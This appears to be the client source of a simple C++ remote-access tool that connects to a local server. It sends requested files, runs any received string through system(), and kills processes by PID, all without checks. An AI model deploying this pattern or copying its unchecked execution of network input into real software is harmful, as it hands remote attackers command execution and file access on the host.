#include <iostream>
#include "../Socket.h"
#include <string.h>
#include <fstream>

using namespace std;

// int tran(string s)
// {
//         s += "> re.txt";
//         int x = system(s.c_str());
//         return x;
// }

void send_file(string file_path, Connection conn)
{
        FILE *filehandle = fopen(file_path.c_str(), "rb");
        if (filehandle != NULL)
        {
                bool ok = conn.sendfile(filehandle);
                fclose(filehandle);
                if (ok)
                        cout << "Send file successfully" << endl;
                else
                        cout << "Failed to send file" << endl;
        }
}

int main(int argc, char const *argv[])
{
        try
        {
                Connection conn("127.0.0.1", 8080);
                printf("> Client: Hello Server!\n");
                string path_ = "../client/send/";
                int choice = 1;
                while (choice != 4)
                {
                        char num = {0};
                        read(conn.getSocket(), &num, sizeof(num));
                        choice = num;
                        cout << "Choice " << choice << endl;
                        switch (choice)
                        {
                        case 1:
                        {
                                string s = conn.re();
                                cout << "File name: " << s << endl;
                                s = path_ + s;
                                // cout << "s: " << s << endl;
                                send_file(s, conn);
                                break;
                        }
                        case 2:
                        {
                                string command = conn.re();
                                cout << "Command: " << command << endl;
                                int res = system(command.c_str());
                                send(conn.getSocket(), &res, sizeof(res), 0);
                                break;
                        }
                        case 3:
                        {
                                int pid = 0;
                                read(conn.getSocket(), &pid, sizeof(pid));
                                cout << "pid: " << pid << endl;
                                stringstream ss;
                                ss << pid;
                                string str = ss.str();
                                string command = "kill -9 " + str;
                                int res = system(command.c_str());

                                send(conn.getSocket(), &res, sizeof(res), 0);
                                cout << command << endl;
                                break;
                        }
                        case 4:
                                cout << "BYE!\n";
                                close(conn.getSocket());
                                break;
                        }
                }

                // send_file("/home/phatnd/HomeLazy/RAT/send/hoa.jpg", conn);
                // send_file("/home/phatnd/HomeLazy/RAT/send/imagefile.jpg", conn);

                // close(conn.getSocket());
        }
        catch (exception &e)
        {
                cerr << e.what() << endl;
                return EXIT_FAILURE;
        }
        return 0;
}